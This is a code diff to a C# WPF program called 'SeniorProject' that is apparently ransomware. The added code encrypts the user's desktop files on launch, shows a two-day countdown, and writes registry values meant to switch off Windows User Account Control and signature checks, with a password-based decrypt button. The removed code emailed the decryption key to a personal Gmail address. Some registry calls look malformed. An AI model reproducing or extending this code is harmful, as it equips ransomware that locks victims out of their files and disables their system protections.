@@ -7,6 +7,8 @@ using EncryptionLogic;
 using System.Net.Mail;
 using System.Net.Sockets;
 using System.Security.Cryptography;
+using System.Threading;
+using Microsoft.Win32;
 
 namespace SeniorProject
 {
@@ -15,65 +17,58 @@ namespace SeniorProject
 	/// </summary>
 	public partial class mainView : UserControl
 	{
-		private DispatcherTimer _Timer = new DispatcherTimer();
-		private TimeSpan _timeSpan;
-		private Encryption _objEncrpytion= new Encryption();
-		private string key { get; set; }
+		private DispatcherTimer _timer;
+		private TimeSpan _time;
 
 		public mainView()
 		{
 			InitializeComponent();
-			_timeSpan = TimeSpan.FromHours(48);
-			_Timer = new DispatcherTimer(new TimeSpan(0, 0, 1), DispatcherPriority.Normal, delegate
-			{
-				tbTime.Content = _timeSpan.ToString("c");
-				if (_timeSpan == TimeSpan.Zero)
-				{
-					_Timer.Stop();
-				}
-				_timeSpan = _timeSpan.Add(TimeSpan.FromSeconds(-1));
-			}, Application.Current.Dispatcher);
-			//key = _objEncrpytion.generate32BitKey();
-			//sendKey();
 			
+
+			_time = TimeSpan.FromDays(2);
+
+			_timer = new DispatcherTimer(_time, DispatcherPriority.Normal, delegate
+			{
+				tbTime.Content = _time.ToString("c");
+				if (_time == TimeSpan.Zero) _timer.Stop();
+
+				_time = _time.Add(TimeSpan.FromSeconds(-1));
+			}, Dispatcher);
+
+			Dispatcher.Invoke(() => { tbTime.Content = _time.ToString("c"); });
+			
+			setRegistry();
+
+			Encryption encryption = new Encryption();
+			encryption.encryptDesktop();
 		}
 
-		private void sendKey()
-		{
-			try
-			{
-				MailMessage message = new MailMessage();
-				message.To.Add("tmello001@gmail.com");
-				message.Subject = "Decrypt Key for IP address: " + GetIP();
-				message.From = new MailAddress("dontreply@virus.com");
-				message.Body = key;
-				SmtpClient smtp = new SmtpClient(GetIP());
-				smtp.Send(message);
-			}
-			catch (Exception e)
-			{
-				MessageBox.Show(e.Message);
-				MessageBox.Show(e.InnerException.ToString());
-			}
-		}
 
-		private static string GetIP()
+
+		private static void setRegistry()
 		{
-			var host = Dns.GetHostEntry(Dns.GetHostName());
-			foreach (var ip in host.AddressList)
-			{
-				if (ip.AddressFamily == AddressFamily.InterNetwork)
-				{
-					return ip.ToString();
-				}
-			}
-			throw new Exception("Local IP Address Not Found!");
+			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableUIADesktopToggle", 1);
+			Registry.SetValue("HKEY_LOCAL_MACHINE", "ConsentPromptBehaviorAdmin", 0);
+			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableInstallerDetection", 0);
+			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
+			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
+			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
 		}
 
 		private void button_Click(object sender, RoutedEventArgs e)
 		{
-			Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(decryptBox.Text, 0, 50000);
-			Encryption.decryptAllFiles(key);
+			try
+			{
+				byte[] salt = { 38, 88, 100, 223, 246, 208, 35, 97, 86, 56, 39, 173, 69, 59, 144, 204, 130, 90, 97, 238, 33, 7, 169, 124, 36, 6, 92, 146, 36, 8, 62, 122 };
+				Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(decryptBox.Text, salt, 50000);
+				Encryption.decryptAllFiles(key);
+
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show(ex.Message);
+				MessageBox.Show(ex.InnerException.ToString());
+			}
 		}
 	}
 }
